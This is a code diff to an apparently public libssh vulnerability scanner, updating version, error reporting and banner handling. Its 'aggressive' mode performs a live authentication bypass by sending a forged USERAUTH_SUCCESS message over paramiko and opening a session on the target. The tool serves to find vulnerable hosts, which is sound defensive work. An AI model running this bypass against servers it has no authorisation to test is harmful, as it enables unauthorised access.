@@ -5,7 +5,7 @@
 import socket, argparse, sys, os, paramiko, ipaddress
 from six import text_type
 
-VERSION = "1.0.3"
+VERSION = "1.0.4"
 
 class colors(object):
     blue = "\033[1;34m"
@@ -25,6 +25,9 @@ def ppatch(ip, port, banner):
 def pvulnerable(ip, port, banner):
   print("{yellow}[!]{white} {ipaddr}:{port} is likely VULNERABLE to authentication bypass ({banner})".format(yellow=colors.yellow, white=colors.normal, ipaddr=ip, port=port, banner=banner.strip()))
 
+def pexception(ip, port, banner):
+  print("{red}[-]{white} {ipaddr}:{port} has encountered an exception ({banner}).".format(red=colors.red, white=colors.normal, ipaddr=ip, port=port, banner=banner.strip()))
+
 
 def passive(ip, port): #banner grab to verify vulnerable host
   try:
@@ -35,17 +38,17 @@ def passive(ip, port): #banner grab to verify vulnerable host
     return banner.split("\n")[0]
   except (socket.timeout, socket.error) as e:
     ptimeout(ip, port)
+    return ""
 
-def aggressive(ip, port): #bypass auth to verify vulnerable host
+def aggressive(ip, port, banner): #bypass auth to verify vulnerable host
   try:
     s = socket.create_connection((ip, port), timeout=0.50000)
-    s.settimeout(None)
+    s.settimeout(None)  
 
     msg = paramiko.message.Message()
     t = paramiko.transport.Transport(s)
     t.start_client()
-    with open("paramiko.log") as f: #tmp solution to get banner, can't seem to get _transport.get_banner() working
-      banner =  f.readlines()[-10].split(" ")[-1]
+
     msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
     t._send_message(msg)
     c = t.open_session(timeout=0.50000)
@@ -57,7 +60,7 @@ def aggressive(ip, port): #bypass auth to verify vulnerable host
     pstatus(ip, port, banner)
     #print e
   except Exception as e:
-    pass
+    pexception(ip, port, banner)
 
 
 parser = argparse.ArgumentParser(description='libssh Scanner - Find vulnerable libssh services by Leap Security (@LeapSecurity)')
@@ -91,7 +94,7 @@ print("Searching for Vulnerable Hosts...\n")
 if args.aggressive:
   paramiko.util.log_to_file("paramiko.log")
   for ip in ips:
-    aggressive(ip, int(args.port))
+    aggressive(ip, int(args.port), passive(ip, int(args.port)))
 else: #banner grab
   for ip in ips:
     banner = passive(ip, int(args.port)) #banner
